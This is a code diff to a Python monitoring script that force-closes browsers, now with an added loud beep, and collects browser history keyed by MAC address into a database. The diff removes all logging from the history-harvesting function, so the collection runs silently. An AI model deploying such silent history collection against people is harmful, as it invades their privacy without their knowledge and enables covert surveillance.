@@ -1,5 +1,6 @@
 import psutil
 import socket
+import winsound
 import pywifi
 import time
 from datetime import datetime
@@ -27,6 +28,12 @@ def get_running_processes():
             continue
     return running_processes
 
+def play_high_volume_sound():
+    """Play a high volume sound when a browser is closed."""
+    frequency = 2500  # Set the frequency of the sound (in Hz)
+    duration = 1000   # Set the duration of the sound (in milliseconds)
+    winsound.Beep(frequency, duration)  # Play the sound on Windows
+
 def close_all_browsers():
     # List of browser process names
     browsers = ['chrome.exe', 'firefox.exe', 'msedge.exe', 'safari.exe']  # For Windows
@@ -40,6 +47,7 @@ def close_all_browsers():
             if proc.info['name'] in browsers:  # Check if the process is one of the browsers
                 proc.terminate()  # Terminate the browser process
                 print(f"Terminated browser process: {proc.info['name']} (PID: {proc.info['pid']})")
+                play_high_volume_sound()
         except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
             pass  # Handle processes that might terminate while we're iterating
 
@@ -334,29 +342,21 @@ def retrieve_browser_history(mac_address):
     # Clear any existing browser history data when the script starts
     try:
         collection.delete_many({})  # Delete all documents from the collection
-        print("Cleared old browser history.")
-    except Exception as e:
-        print(f"Error clearing old history: {e}")
+    except Exception:
         return
 
     # Get the browser history
     try:
         history = get_history()  # Assuming get_history is defined elsewhere
-    except Exception as e:
-        print(f"Error retrieving history: {e}")
+    except Exception:
         return
 
     if not history:
-        print("Failed to retrieve history.")
         return
 
     history_data = history.histories
 
-    # Debugging: Print the structure of history_data
-    print("Browser history data structure:", history_data)
-
     if not history_data:
-        print("No browser history found.")
         return
 
     entries = []
@@ -374,7 +374,6 @@ def retrieve_browser_history(mac_address):
 
     # Iterate through the history data and filter out invalid entries
     for entry in history_data:
-        print(f"Entry: {entry}")
         if is_valid_entry(entry):
             timestamp, url, title = entry[:3]  # Extract the timestamp and url
             # Convert timestamp to a string in the desired format
@@ -388,25 +387,19 @@ def retrieve_browser_history(mac_address):
                     'title': title
                 }
                 entries.append(entry_data)
-            else:
-                print(f"Skipping invalid entry: {entry}")
 
     # Insert only valid entries into the collection
     if entries:
         try:
-            print(f"Inserting {len(entries)} valid entries into the collection...")
             result = collection.insert_many(entries)
-            print(f"Inserted {len(result.inserted_ids)} documents.")
-        except Exception as e:
-            print(f"An error occurred while inserting entries: {e}")
-    else:
-        print("No valid entries to insert.")
+        except Exception:
+            return
 
     # Check if collection exists after insertion
     if collection.count_documents({}) > 0:
-        print(f"Collection '{collection.name}' created successfully with {collection.count_documents({})} documents.")
+        return
     else:
-        print(f"Collection '{collection.name}' is empty or not created.")
+        return
 
 
 class FileChangeHandler(FileSystemEventHandler):
